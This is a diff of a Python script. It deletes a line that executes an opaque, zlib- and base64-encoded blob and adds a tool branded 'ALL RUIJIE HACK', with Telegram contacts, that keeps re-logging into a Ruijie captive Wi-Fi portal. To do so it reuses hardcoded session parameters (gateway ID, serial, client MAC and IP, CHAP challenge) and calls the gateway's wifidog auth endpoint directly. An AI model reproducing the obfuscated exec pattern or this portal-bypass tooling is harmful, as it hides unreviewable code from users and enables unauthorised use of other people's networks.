@@ -1,2 +1,150 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode('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')))
+import os
+import re
+import base64
+import time
+import requests
+from urllib.parse import urlparse, parse_qs, urljoin
+
+# Terminal Color Codes
+bcyan = "\033[1;36m"
+reset = "\033[0m"
+white = "\033[0;37m"
+bgreen = "\033[1;32m"
+bred = "\033[1;31m"
+yellow = "\033[0;33m"
+
+r = "\033[1;31m"
+g = "\033[1;32m"
+w = "\033[0m"
+
+TIMEOUT_SEC = 10
+
+def show_banner():
+    try:
+        os.system('clear' if os.name == 'posix' else 'cls')
+    except:
+        pass
+    print(f"{bcyan}")
+    print(r"""  ____  _   _ _____ ___ _____ 
+ |  _ \| | | |_ _|_ _| ____| ____|
+ | |_) | | | || | | ||  _| |  _|  
+ |  _ <| |_| || | | || |___| |___ 
+ |_| \_\\___/|___|___|_____|_____|""")
+    print(f"      ⚡ ALL RUIJIE HACK ⚡")
+    print(f"      Telegram : @naymin126653/@Christmas4040")
+    print(f"      [ MODE: REQUESTS SESSION ]")
+    print(f"{reset}")
+
+class RuijieLoginManager:
+    def __init__(self):
+        self.ip = None
+        self.mac = None
+        self.current_sid = None
+        self.session = requests.Session()
+        self.phone_number = "12345678901"
+
+    def check_internet(self):
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+        try:
+            resp = self.session.get(test_url, timeout=5, allow_redirects=False)
+            return resp.status_code == 204
+        except:
+            return False
+
+    def auto_detect_gateway(self):
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'}
+        try:
+            resp = self.session.get(test_url, headers=headers, timeout=5, allow_redirects=False)
+            if resp.status_code in (301, 302):
+                location = resp.headers.get('Location', '')
+                parsed_url = urlparse(location)
+                query_params = parse_qs(parsed_url.query)
+                
+                gw_addr = query_params.get('gw_address')
+                if gw_addr: self.ip = gw_addr[0]
+                
+                mac = query_params.get('mac') or query_params.get('umac')
+                if mac: self.mac = mac[0]
+                
+                return True
+        except:
+            pass
+        return self.ip is not None
+
+    def fetch_sid(self):
+        if not self.ip: return None
+        
+        step1_url = "https://portal-as.ruijienetworks.com/auth/wifidogAuth/login/?gw_id=c4b25be7c214&gw_sn=H1U320M001153&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.24&mac=5e:81:22:0b:f0:74&slot_num=14&nasip=192.168.1.166&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C006&chap_challenge=%5C262%5C050%5C017%5C376%5C373%5C321%5C110%5C247%5C102%5C033%5C243%5C231%5C130%5C012%5C345%5C112"
+        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'}
+        
+        try:
+            r1 = self.session.get(step1_url, headers=headers, timeout=TIMEOUT_SEC)
+            js_match = re.search(r"self\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            if not js_match: return None
+            
+            step2_url = urljoin("https://portal-as.ruijienetworks.com", js_match.group(1))
+            r2 = self.session.get(step2_url, headers=headers, timeout=TIMEOUT_SEC, allow_redirects=False)
+            
+            if r2.status_code == 302:
+                location = r2.headers.get('Location', '')
+                sid = parse_qs(urlparse(location).query).get('sessionId')
+                if sid:
+                    self.current_sid = sid[0]
+                    return self.current_sid
+        except:
+            pass
+        return None
+
+    def login_voucher(self, voucher):
+        if not self.current_sid: self.fetch_sid()
+        if not self.current_sid: return False
+
+        post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+        data = {"accessCode": voucher, "sessionId": self.current_sid, "apiVersion": 1}
+        headers = {
+            "Content-Type": "application/json",
+            "Referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={self.current_sid}"
+        }
+        
+        try:
+            resp = self.session.post(post_url, json=data, headers=headers, timeout=TIMEOUT_SEC)
+            return 'logonUrl' in resp.text
+        except:
+            return False
+
+    def send_final_auth(self):
+        if not self.ip or not self.current_sid: return False
+        auth_url = f'http://{self.ip}:2060/wifidog/auth'
+        params = {'token': self.current_sid, 'phoneNumber': self.phone_number}
+        try:
+            resp = self.session.get(auth_url, params=params, timeout=TIMEOUT_SEC)
+            return resp.status_code == 200
+        except:
+            return False
+
+def start():
+    show_banner()
+    voucher = input(f"\n{yellow} Enter Voucher Code : {reset}").strip()
+    if not voucher: return
+
+    manager = RuijieLoginManager()
+    print(f"\n{bgreen}[ * ] Keep-Alive Monitoring Started (Requests Mode).{reset}")
+    
+    while True:
+        try:
+            if not manager.check_internet():
+                print(f"{yellow}[!] Connection lost. Re-authenticating...{reset}")
+                if manager.auto_detect_gateway():
+                    if manager.login_voucher(voucher):
+                        if manager.send_final_auth():
+                            print(f"{g}[+] Re-connected Successfully!{reset}")
+            time.sleep(5)
+        except KeyboardInterrupt:
+            print("\n[!] Stopped by user.")
+            break
+        except Exception as e:
+            time.sleep(5)
+
+if __name__ == "__main__":
+    start()
